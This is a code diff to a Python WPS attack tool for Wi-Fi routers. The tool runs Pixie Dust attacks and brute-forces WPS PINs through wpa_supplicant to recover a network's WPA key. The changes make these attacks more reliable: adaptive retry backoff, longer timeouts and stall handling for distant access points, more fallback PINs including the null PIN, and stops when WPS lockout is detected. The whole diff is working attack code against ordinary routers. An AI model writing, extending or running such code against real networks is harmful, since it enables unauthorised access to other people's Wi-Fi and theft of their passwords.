@@ -1218,6 +1218,12 @@ def _install_hint(tool: str) -> str:
             'Fedora': 'dnf install aircrack-ng', 'Manjaro': 'pamac install aircrack-ng',
             'Termux': 'pkg install aircrack-ng',
         },
+        'airodump-ng': {
+            'Kali': 'apt install aircrack-ng', 'Debian': 'apt install aircrack-ng',
+            'Ubuntu': 'apt install aircrack-ng', 'Arch': 'pacman -S aircrack-ng',
+            'Fedora': 'dnf install aircrack-ng', 'Manjaro': 'pamac install aircrack-ng',
+            'Termux': 'pkg install aircrack-ng',
+        },
         'macchanger': {
             'Kali': 'apt install macchanger', 'Debian': 'apt install macchanger',
             'Ubuntu': 'apt install macchanger', 'Arch': 'pacman -S macchanger',
@@ -1442,6 +1448,7 @@ def _print_health_check(interface: str = '') -> None:
     _optional_map = {
         'rfkill':      'rfkill unblock/block WiFi',
         'aircrack-ng': 'WPA cracking + monitor mode',
+        'airodump-ng': 'Packet capture + target inspection',
         'hashcat':     'GPU-accelerated hash cracking',
         'macchanger':  'MAC spoofing for -M/--mac-changer',
         'nmcli':       'NetworkManager CLI (--use-nm / --save-ap)',
@@ -1634,6 +1641,9 @@ def _auto_smart_attack(companion, bssid: str, ssid: str = '', args=None) -> bool
     if ssid_hints:
         _stage(2, f'SSID-hint PINs  ({len(ssid_hints)} candidate(s))…')
         for p in ssid_hints:
+            if companion.connection_status.wps_locked:
+                print(f'{warn} Target AP locked WPS -- stopping SSID hint stage.')
+                break
             result = companion.single_connection(
                 bssid=bssid, ssid=ssid, pin=p, pixiemode=False,
                 output_file=out_file, freq_mhz=_freq)
@@ -1661,6 +1671,9 @@ def _auto_smart_attack(companion, bssid: str, ssid: str = '', args=None) -> bool
     unique    = [p for p in all_pins if p not in seen]
     _stage(3, f'Vendor algo + DB PINs  ({len(unique)} candidate(s), confidence-ordered)…')
     for p in unique:
+        if companion.connection_status.wps_locked:
+            print(f'{warn} Target AP locked WPS -- stopping vendor algorithm stage.')
+            break
         seen.add(p)
         result = companion.single_connection(
             bssid=bssid, ssid=ssid, pin=p, pixiemode=False,
@@ -1703,6 +1716,16 @@ def getAndroidApiLevel() -> int:
                            capture_output=True, text=True, timeout=2)
         if r.returncode == 0 and r.stdout.strip().isdigit():
             return int(r.stdout.strip())
+    except Exception:
+        pass
+    try:
+        if os.path.isfile('/system/build.prop'):
+            with open('/system/build.prop', 'r', encoding='utf-8', errors='replace') as _fp:
+                for _ln in _fp:
+                    if 'ro.build.version.sdk=' in _ln:
+                        _v = _ln.split('=', 1)[1].strip()
+                        if _v.isdigit():
+                            return int(_v)
     except Exception:
         pass
     return 0
@@ -1762,10 +1785,20 @@ class NetworkAddress:
             self._int_repr = mac
             self._str_repr = self._int2mac(mac)
         elif isinstance(mac, str):
-            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
-            self._int_repr = self._mac2int(mac)
+            clean_str = mac.replace('-', ':').replace('.', ':').strip().upper()
+            if not clean_str:
+                self._str_repr = '00:00:00:00:00:00'
+                self._int_repr = 0
+            else:
+                self._str_repr = clean_str
+                try:
+                    self._int_repr = self._mac2int(clean_str)
+                except (ValueError, TypeError):
+                    self._str_repr = '00:00:00:00:00:00'
+                    self._int_repr = 0
         else:
-            raise ValueError(f'{info} MAC address must be string or integer')
+            self._str_repr = '00:00:00:00:00:00'
+            self._int_repr = 0
 
     @property
     def string(self):
@@ -4692,7 +4725,7 @@ class ConnectionStatus:
                  'wpa_psk', 'wps_locked', 'lock_wait', 'm_message_time',
                  'attempt_start_time', 'auth_failures',
                  '_last_printed', '_scan_cycles', 'del_station_count',
-                 'error_code')
+                 'error_code', 'phase_timestamps')
 
     def __init__(self):
         self.status            = ''
@@ -4709,6 +4742,14 @@ class ConnectionStatus:
         self._scan_cycles      = 0     # count of scan->assoc->assoc'd cycles this attempt
         self.del_station_count = 0     # NL80211_CMD_DEL_STATION occurrences (de-auth events)
         self.error_code        = ''    # AttackResult structured code
+        self.phase_timestamps  = {}    # phase name -> wall-clock timestamp
+
+    def record_phase(self, phase: str):
+        """Record timestamp for an exchange phase transition and log diagnostic trace."""
+        now = time.time()
+        self.phase_timestamps[phase] = now
+        elapsed = (now - self.attempt_start_time) if self.attempt_start_time else 0.0
+        logger.debug('WPS phase transition: %s (elapsed since start: %.2fs)', phase, elapsed)
 
     def isFirstHalfValid(self) -> bool:
         return self.last_m_message > 5
@@ -4717,6 +4758,82 @@ class ConnectionStatus:
         saved_lock_wait = self.lock_wait
         self.__init__()
         self.lock_wait = saved_lock_wait
+
+
+class SubprocessLineReader:
+    """Non-blocking, zero-lag line reader for subprocess stdout streams.
+
+    Avoids Python's buffered I/O deadlock hazard where select.select()
+    reports no data on the OS pipe even though lines are trapped inside
+    Python's internal user-space TextIOWrapper/BufferedReader buffer.
+    """
+
+    def __init__(self, proc: Optional[subprocess.Popen]):
+        self.proc = proc
+        self._queue: collections.deque = collections.deque()
+        self._partial: str = ''
+        self.fd: Optional[int] = None
+        if proc and proc.stdout:
+            try:
+                self.fd = proc.stdout.fileno()
+                os.set_blocking(self.fd, False)
+            except Exception:
+                self.fd = None
+
+    def _fill_buffer(self, timeout: float = 0.0):
+        if self.fd is None:
+            return
+        if timeout > 0:
+            try:
+                r, _, _ = _select.select([self.fd], [], [], timeout)
+                if not r:
+                    return
+            except (ValueError, OSError):
+                return
+        while True:
+            try:
+                raw = os.read(self.fd, 8192)
+                if not raw:
+                    break
+                self._partial += raw.decode('utf-8', errors='replace')
+            except (BlockingIOError, InterruptedError):
+                break
+            except Exception:
+                break
+        if '\n' in self._partial:
+            lines = self._partial.split('\n')
+            for ln in lines[:-1]:
+                self._queue.append(ln)
+            self._partial = lines[-1]
+
+    def readline(self, timeout: float = 0.1) -> Optional[str]:
+        """Read next available line, waiting up to timeout seconds if empty."""
+        if self._queue:
+            return self._queue.popleft()
+        self._fill_buffer(timeout)
+        if self._queue:
+            return self._queue.popleft()
+        return None
+
+    def has_lines(self) -> bool:
+        """Check if complete lines are currently ready in buffer."""
+        return bool(self._queue)
+
+    def drain(self):
+        """Immediately discard all queued lines and pending OS pipe bytes."""
+        self._queue.clear()
+        self._partial = ''
+        if self.fd is None:
+            return
+        while True:
+            try:
+                raw = os.read(self.fd, 8192)
+                if not raw:
+                    break
+            except (BlockingIOError, InterruptedError):
+                break
+            except Exception:
+                break
 
 
 # -- Bruteforce progress tracker -------------------------------------------------
@@ -4886,6 +5003,7 @@ class Companion:
         self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT,
                                      encoding='utf-8', errors='replace')
+        self.wpas_reader = SubprocessLineReader(self.wpas)
         deadline = time.time() + 30
         while True:
             ret = self.wpas.poll()
@@ -4945,6 +5063,12 @@ class Companion:
             if respond == 'UNKNOWN COMMAND':
                 return (f'{err} wpa_supplicant compiled without WPS support. '
                         'Rebuild with CONFIG_WPS=y or install a full package.')
+            elif 'FAIL-BUSY' in respond:
+                return (f'{err} wpa_supplicant returned FAIL-BUSY: driver/interface is busy scanning or associating. '
+                        'Adaptive backoff could not clear the state in time.')
+            elif 'FAIL' in respond:
+                return (f'{err} wpa_supplicant rejected WPS command ({respond}). '
+                        'Target AP might be unreachable, out of range, or interface state is down.')
         return f'{err} wpa_supplicant returned unexpected response: {respond!r}'
 
     def _restart_wpas(self) -> bool:
@@ -4993,15 +5117,20 @@ class Companion:
     def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
         if not verbose:
             verbose = self.print_debug
-        line = self.wpas.stdout.readline()
-        if not line:
-            # Process EOF -- wpa_supplicant exited or crashed
-            try:
-                self.wpas.wait(timeout=1)
-            except Exception:
-                pass
-            return False
-        line = line.rstrip('\n')
+        if hasattr(self, 'wpas_reader') and self.wpas_reader:
+            line = self.wpas_reader.readline(timeout=0.1)
+        else:
+            line = self.wpas.stdout.readline() if hasattr(self, 'wpas') and self.wpas else None
+        if line is None:
+            if hasattr(self, 'wpas') and self.wpas and self.wpas.poll() is not None:
+                # Process EOF -- wpa_supplicant exited or crashed
+                try:
+                    self.wpas.wait(timeout=1)
+                except Exception:
+                    pass
+                return False
+            return True
+        line = line.rstrip('\r\n')
 
         if verbose:
             # Skip raw hexdump lines for fields we already print in parsed/
@@ -5181,6 +5310,8 @@ class Companion:
                 self.pixie_creds.wps2 = True
             elif 'Network Key' in line and 'hexdump' in line:
                 self.connection_status.status = 'GOT_PSK'
+                self.connection_status.error_code = AttackResult.GOT_PSK
+                self.connection_status.record_phase('got_psk')
                 raw_hex = get_hex(line)
                 if raw_hex:
                     try:
@@ -5207,6 +5338,7 @@ class Companion:
         elif ': State: ' in line:
             if '-> SCANNING' in line:
                 self.connection_status.status = 'scanning'
+                self.connection_status.record_phase('scanning')
                 # Count how many scan cycles have happened this attempt.
                 # Print the first 2 cycles normally; after that collapse
                 # repeated scan/associate/associated noise into a single
@@ -5216,6 +5348,8 @@ class Companion:
         elif 'WPS-AP-SETUP-LOCKED' in line:
             self.connection_status.wps_locked = True
             self.connection_status.status = 'WPS_FAIL'
+            self.connection_status.error_code = AttackResult.WPS_LOCKED
+            self.connection_status.record_phase('wps_locked')
             wait = self.connection_status.lock_wait or 60
             self.connection_status.lock_wait = min(wait * 2, 600)
             print(f'{warn} WPS is locked on this AP! Backing off for {wait}s…')
@@ -5224,9 +5358,12 @@ class Companion:
         elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
             if not pixiemode or self.connection_status.last_m_message >= 4:
                 self.connection_status.status = 'WPS_FAIL'
+                self.connection_status.error_code = AttackResult.WPS_FAIL
+                self.connection_status.record_phase('wps_fail')
                 print(f'{err} wpa_supplicant returned WPS-FAIL')
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
+            self.connection_status.record_phase('authenticating')
             if 'SSID' in line:
                 try:
                     self.connection_status.essid = codecs.decode(
@@ -5240,6 +5377,7 @@ class Companion:
             print(f'{ok} Authenticated')
         elif 'Trying to associate with' in line:
             self.connection_status.status = 'associating'
+            self.connection_status.record_phase('associating')
             if 'SSID' in line:
                 try:
                     self.connection_status.essid = codecs.decode(
@@ -5259,6 +5397,7 @@ class Companion:
             self.connection_status.del_station_count += 1
         elif 'EAPOL: txStart' in line:
             self.connection_status.status = 'eapol_start'
+            self.connection_status.record_phase('eapol_start')
             print(f'{info} Sending EAPOL Start…')
         elif 'EAP entering state IDENTITY' in line:
             print(f'{info} Received Identity Request')
@@ -5536,33 +5675,49 @@ class Companion:
                          verbose=None, freq_mhz=None):
         self.connection_status.clear()
         self.pixie_creds.clear()
+        self.connection_status.attempt_start_time = time.time()
+        self.connection_status.bssid = bssid or ''
 
-        # Drain pending wpa_supplicant output (longer window to clear residual state)
-        while True:
-            ready, _, _ = _select.select([self.wpas.stdout], [], [], 0.25)
-            if not ready:
-                break
-            line = self.wpas.stdout.readline()
-            if not line:
-                break
+        # Drain pending wpa_supplicant output to clear any residual state from prior runs
+        if hasattr(self, 'wpas_reader') and self.wpas_reader:
+            self.wpas_reader.drain()
+        elif hasattr(self, 'wpas') and self.wpas and self.wpas.stdout:
+            while True:
+                ready, _, _ = _select.select([self.wpas.stdout], [], [], 0.05)
+                if not ready:
+                    break
+                line = self.wpas.stdout.readline()
+                if not line:
+                    break
 
         # -- Frequency-targeted pre-scan ---------------------------------
         # Telling wpa_supplicant to scan only the AP's exact frequency means
         # it finds the AP in one scan cycle instead of sweeping all channels.
         # This cuts the scan->associate->EAPOL delay from ~6 cycles to ~1.
         if not pbc_mode:
-            # Trigger a targeted scan on the AP's frequency (fast) or a full scan.
-            # A fresh scan ensures wpa_supplicant's BSS table has a current entry
-            # for the target so WPS_REG can associate on the first attempt.
             scan_cmd = f'SCAN freq={freq_mhz}' if freq_mhz else 'SCAN'
             self.sendOnly(scan_cmd)
-            time.sleep(1.0)   # give the scan time to complete before WPS_REG
-            # drain scan output
-            while True:
-                ready, _, _ = _select.select([self.wpas.stdout], [], [], 0.1)
-                if not ready:
-                    break
-                self.wpas.stdout.readline()
+            # Adaptively wait for scan completion instead of arbitrary blind sleep
+            _scan_deadline = time.time() + (3.5 if freq_mhz else 6.0)
+            while time.time() < _scan_deadline:
+                if hasattr(self, 'wpas_reader') and self.wpas_reader:
+                    _sline = self.wpas_reader.readline(timeout=0.15)
+                else:
+                    _ready, _, _ = _select.select([self.wpas.stdout], [], [], 0.15)
+                    _sline = self.wpas.stdout.readline() if _ready else None
+                if _sline:
+                    if 'CTRL-EVENT-SCAN-RESULTS' in _sline or 'CTRL-EVENT-SCAN-FAILED' in _sline:
+                        break
+
+            # Fast-drain scan output lines
+            if hasattr(self, 'wpas_reader') and self.wpas_reader:
+                self.wpas_reader.drain()
+            elif hasattr(self, 'wpas') and self.wpas and self.wpas.stdout:
+                while True:
+                    _ready, _, _ = _select.select([self.wpas.stdout], [], [], 0.05)
+                    if not _ready:
+                        break
+                    self.wpas.stdout.readline()
 
         if pbc_mode:
             if bssid:
@@ -5575,23 +5730,43 @@ class Companion:
             print(f"{info} Trying PIN '{pin}'…")
             cmd = f'WPS_REG {bssid} {pin}'
 
-        # Retry WPS_REG/WPS_PBC command up to 3 times if wpa_supplicant isn't
-        # ready yet (transient NOT-READY / socket busy / empty responses).
+        # Retry WPS_REG/WPS_PBC command with adaptive backoff if wpa_supplicant
+        # is busy scanning or completing a previous state cycle.
         r = ''
-        for _cmd_try in range(3):
+        _max_cmd_retries = 6
+        for _cmd_try in range(_max_cmd_retries):
             r = self.sendAndReceive(cmd)
             if 'OK' in r:
                 break
-            if _cmd_try < 2:
-                time.sleep(0.5)
+            if 'FAIL-BUSY' in r:
+                logger.debug('wpa_supplicant returned FAIL-BUSY for %s (try %d/%d) -- waiting for driver to clear',
+                             cmd, _cmd_try + 1, _max_cmd_retries)
+                _wait = min(0.4 * (1.5 ** _cmd_try), 2.0)
+                _end_busy = time.time() + _wait
+                while time.time() < _end_busy:
+                    if hasattr(self, 'wpas_reader') and self.wpas_reader:
+                        _bl = self.wpas_reader.readline(timeout=0.1)
+                    else:
+                        _br, _, _ = _select.select([self.wpas.stdout], [], [], 0.1)
+                        _bl = self.wpas.stdout.readline() if _br else None
+                    if _bl and ('CTRL-EVENT-SCAN-RESULTS' in _bl or 'CTRL-EVENT-DISCONNECTED' in _bl):
+                        break
+            else:
+                if _cmd_try < _max_cmd_retries - 1:
+                    time.sleep(0.5)
+
         if 'OK' not in r:
             self.connection_status.status = 'WPS_FAIL'
+            self.connection_status.error_code = AttackResult.WPS_FAIL
             print(self._explain_wpas_not_ok_status(cmd, r))
             return False
 
-        conn_timeout = self.timeout
+        # Long-distance WiFi adaptations:
+        # Generous timeout and stall limit accommodate weak signals and frame retransmissions.
+        conn_timeout = max(self.timeout, 35)
         deadline = time.time() + conn_timeout
         _deadline_extended = False   # extend once when AP proves it's alive
+        _stall_limit = 25.0          # generous stall window for slow APs and packet retransmissions
 
         while True:
             _now = time.time()
@@ -5600,24 +5775,24 @@ class Companion:
                 print(f'{warn} WPS exchange timed out after {conn_timeout}s -- '
                       f'AP may be unreachable or rate-limiting.')
                 self.connection_status.status = 'WPS_FAIL'
+                self.connection_status.error_code = AttackResult.TIMEOUT
                 break
             if not os.path.exists(f'/sys/class/net/{self.interface}'):
                 print(f'\n{err} Interface {self.interface} disappeared during WPS exchange -- aborting')
                 self.connection_status.status = 'WPS_FAIL'
+                self.connection_status.error_code = AttackResult.INTERFACE_DOWN
                 break
             if self.wpas.poll() is not None:
                 print(f'\n{warn} wpa_supplicant exited unexpectedly (code {self.wpas.returncode}) -- '
                       f'attempting recovery')
-                if self._restart_wpas():
-                    self.connection_status.status = 'WPS_FAIL'
-                else:
-                    self.connection_status.status = 'WPS_FAIL'
+                self._restart_wpas()
+                self.connection_status.status = 'WPS_FAIL'
+                self.connection_status.error_code = AttackResult.WPAS_CRASH
                 break
 
             # -- Deadline extension on first contact ----------------------
             # Once the AP has replied with M2 or later, we know it is alive
-            # and worth waiting for.  Extend the deadline to ensure a slow
-            # but responding AP gets the full timeout from the point of contact.
+            # and worth waiting for. Extend deadline to ensure slow AP gets full window.
             _last_m = self.connection_status.last_m_message
             _m_time = self.connection_status.m_message_time
             if _last_m >= 2 and not _deadline_extended:
@@ -5626,21 +5801,16 @@ class Companion:
 
             # -- Per-message stall detection -------------------------------
             # When we're past M2 but no new M-message has arrived for
-            # M_STALL_SEC seconds, the AP has gone silent mid-exchange.
-            # Cancel immediately and retry the same PIN -- no point burning
-            # the full remaining timeout waiting for a reply that won't come.
-            if _last_m >= 3 and _m_time > 0:
+            # _stall_limit seconds, cancel and retry to prevent burning idle time.
+            if _last_m >= 2 and _m_time > 0:
                 _stall_sec = _now - _m_time
-                _stall_limit = 15.0  # seconds -- generous for slow APs
                 if _stall_sec > _stall_limit:
                     print(f'{warn} AP silent for {_stall_sec:.0f}s after M{_last_m} -- '
                           f'cancelling early and retrying same PIN')
                     self.connection_status.status = 'M_STALL'
+                    self.connection_status.error_code = AttackResult.M_STALL
                     break
 
-            ready, _, _ = _select.select([self.wpas.stdout], [], [], 0.1)
-            if not ready:
-                continue
             res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
             if not res:
                 break
@@ -5648,18 +5818,25 @@ class Companion:
                 break
             elif self.connection_status.status in ('WSC_NACK', 'WPS_FAIL'):
                 if pixiemode:
+                    # Fast-drain crypto fields that may arrive right alongside NACK
                     _drain_end = time.time() + 1.50
                     while time.time() < _drain_end:
                         if self.pixie_creds.all_ok():
                             break
-                        _dr, _, _ = _select.select([self.wpas.stdout], [], [], 0.10)
-                        if _dr:
-                            self.__handle_wpas(pixiemode=True,
-                                               pbc_mode=False,
-                                               verbose=verbose)
+                        _dr = self.__handle_wpas(pixiemode=True,
+                                                 pbc_mode=False,
+                                                 verbose=verbose)
+                        if not _dr:
+                            break
+                        if not (hasattr(self, 'wpas_reader') and self.wpas_reader and self.wpas_reader.has_lines()):
+                            time.sleep(0.04)
                 break
 
+        # Cancel WPS and disconnect to cleanly reset internal state machine
         self.sendOnly('WPS_CANCEL')
+        self.sendOnly('DISCONNECT')
+        if hasattr(self, 'wpas_reader') and self.wpas_reader:
+            self.wpas_reader.drain()
         return False
 
     def single_connection(self, bssid=None, ssid=None, pin=None, pixiemode=False,
@@ -5745,8 +5922,17 @@ class Companion:
                 print(f'{info} Automatically falling back to likely PIN and NULL PIN (00000000)…')
                 fallback_pins = []
                 likely = self.generator.getLikely(bssid) if bssid else None
-                if likely and likely != pin:
+                if likely and likely != pin and likely not in fallback_pins:
                     fallback_pins.append(likely)
+                try:
+                    suggested = self.generator.getSuggestedList(bssid)
+                    for sp in suggested:
+                        if sp and sp not in fallback_pins and sp != pin:
+                            fallback_pins.append(sp)
+                            if len(fallback_pins) >= 4:
+                                break
+                except Exception:
+                    pass
                 if '00000000' not in fallback_pins and pin != '00000000':
                     fallback_pins.append('00000000')
 
@@ -5754,6 +5940,7 @@ class Companion:
                     if self.connection_status.wps_locked:
                         print(f'{warn} Target AP locked WPS — aborting fallback PIN attempts.')
                         break
+                    time.sleep(0.8)
                     print(f'{info} Fallback: Trying PIN {f_pin}…')
                     logger.info('Pixie Dust fallback trying PIN %s for BSSID %s', f_pin, bssid)
                     res = self.single_connection(bssid=bssid, ssid=ssid, pin=f_pin, pixiemode=False,
@@ -6275,7 +6462,11 @@ class WiFiScanner:
         """Parse iw scan output into a structured network list."""
 
         def handle_network(line, result, networks):
+            raw_bssid = result.group(1).upper()
+            if not re.match(r'^([0-9A-F]{2}[:-]){5}[0-9A-F]{2}$', raw_bssid):
+                return
             networks.append({
+                'BSSID': raw_bssid,
                 'Security type': 'Unknown',
                 'WPS': False, 'WPS locked': False, 'WPS2': False,
                 'WPA3': False, 'Model': '', 'Model number': '',
@@ -6283,7 +6474,6 @@ class WiFiScanner:
                 'ESSID': '', 'Level': -100, 'Channel': 0,
                 'Band': '', 'Freq': 0,
             })
-            networks[-1]['BSSID'] = result.group(1).upper()
 
         def handle_essid(line, result, networks):
             if not networks:
@@ -6299,7 +6489,8 @@ class WiFiScanner:
             if not networks:
                 return
             try:
-                networks[-1]['Level'] = int(float(result.group(1)))
+                lvl = int(float(result.group(1)))
+                networks[-1]['Level'] = max(-100, min(0, lvl))
             except (ValueError, TypeError):
                 pass
 
@@ -7487,7 +7678,7 @@ class TermuxCompat:
     """
 
     REQUIRED_TOOLS  = ['wpa_supplicant', 'iw', 'pixiewps', 'ip']
-    OPTIONAL_TOOLS  = ['aircrack-ng', 'macchanger', 'rfkill', 'nmcli', 'busybox']
+    OPTIONAL_TOOLS  = ['aircrack-ng', 'airodump-ng', 'macchanger', 'rfkill', 'nmcli', 'busybox']
 
     # Packages that provide the required tools when installed via pkg/apt in Termux
     PKG_MAP = {
@@ -7496,6 +7687,7 @@ class TermuxCompat:
         'pixiewps':       'pixiewps',
         'ip':             'iproute2',
         'aircrack-ng':    'aircrack-ng',
+        'airodump-ng':    'aircrack-ng',
         'macchanger':     'macchanger',
         'rfkill':         'rfkill',
     }
@@ -7749,6 +7941,12 @@ class AdvancedPINAlgorithms:
 def ifaceUp(iface, down=False):
     action = 'down' if down else 'up'
     logger.debug('ifaceUp called: interface=%s action=%s', iface, action)
+
+    if isAndroid() and not down:
+        try:
+            subprocess.run('svc wifi enable 2>/dev/null', shell=True)
+        except Exception:
+            pass
 
     # Primary: ip link
     cmd = f'ip link set {iface} {action}'
@@ -8529,6 +8727,9 @@ if __name__ == '__main__':
                         print(f'{info} --all-pins mode: trying {len(all_pins)} PINs for {args.bssid}')
                         success  = False
                         for p in all_pins:
+                            if companion.connection_status.wps_locked:
+                                print(f'{warn} Target AP locked WPS — aborting remaining PIN attempts.')
+                                break
                             if companion.single_connection(
                                     bssid=args.bssid, ssid=args.ssid,
                                     pin=p, pixiemode=False,
